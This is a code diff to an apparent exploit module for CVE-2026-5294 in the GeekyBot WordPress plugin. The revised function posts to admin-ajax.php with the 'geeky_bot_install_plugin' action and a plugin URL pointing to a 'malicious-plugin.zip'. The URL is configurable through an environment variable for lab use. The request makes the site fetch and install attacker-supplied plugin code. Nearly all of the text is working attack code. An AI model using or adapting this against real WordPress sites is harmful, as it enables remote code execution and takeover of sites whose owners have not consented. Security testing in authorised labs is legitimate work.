@@ -2,6 +2,9 @@
 
 from __future__ import annotations
 
+import os
+from typing import Any, Dict
+
 from cpointed.core.engine import ScanResult, Target
 from cpointed.core.session import CPointedClient
 from cpointed.modules.wordpress.base import WordPressModule
@@ -20,40 +23,38 @@ class CVE20265294GeekyBot(WordPressModule):
 
     async def exploit_remote_primitive(
         self,
-        target: Target,
         client: CPointedClient,
+        wp_path: str,
         *,
+        target: Target,
         timeout: float,
-    ) -> dict:
-        """Addon install primitive: empty ZIP marker + handler action (replace URL/slug with PoC values)."""
-        ajax = self._path(target, "/wp-admin/admin-ajax.php")
-        out: dict = {"admin_ajax_posts": []}
+    ) -> Dict[str, Any]:
+        """
+        ``geeky_bot_install_plugin`` + ``plugin_slug`` URL to ZIP (use ``CPOINTED_GEEKYBOT_INSTALL_URL`` in lab).
+        """
+        ajax = self._path_for_wp(wp_path, "/wp-admin/admin-ajax.php")
+        install_payload = {
+            "action": "geeky_bot_install_plugin",
+            "plugin_slug": os.environ.get(
+                "CPOINTED_GEEKYBOT_INSTALL_URL",
+                "https://127.0.0.1:9/malicious-plugin.zip",
+            ),
+        }
         try:
-            minimal_zip = (
-                b"PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00"
-                b"readme.txt\x01\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-            )
-            files = {"addon_zip": ("cpointed-probe.zip", minimal_zip, "application/zip")}
-            data = {
-                "action": "geekybot_download_and_install_plugin",
-                "plugin_slug": "cpointed-probe",
-                "download_url": "http://127.0.0.1:9/cpointed-probe.zip",
+            resp = await client.post(ajax, data=install_payload, timeout=timeout)
+            ok = resp.status_code == 200
+            return {
+                "install_triggered": ok,
+                "install_status_code": resp.status_code,
+                "response_truncated": (resp.text or "")[:100],
+                "success": ok,
             }
-            r = await client.request("POST", ajax, data=data, files=files, timeout=timeout)
-            out["admin_ajax_posts"].append(
-                {
-                    "path": ajax,
-                    "action": data["action"],
-                    "status_code": r.status_code,
-                    "body_snippet": (r.text or "")[:2000],
-                }
-            )
         except Exception as exc:  # pragma: no cover - network
-            out["admin_ajax_posts"].append(
-                {"action": "geekybot_download_and_install_plugin", "error": str(exc)}
-            )
-        return out
+            return {
+                "install_triggered": False,
+                "response_truncated": str(exc)[:100],
+                "success": False,
+            }
 
     async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
         return await self.check_from_readme(target, timeout=timeout)
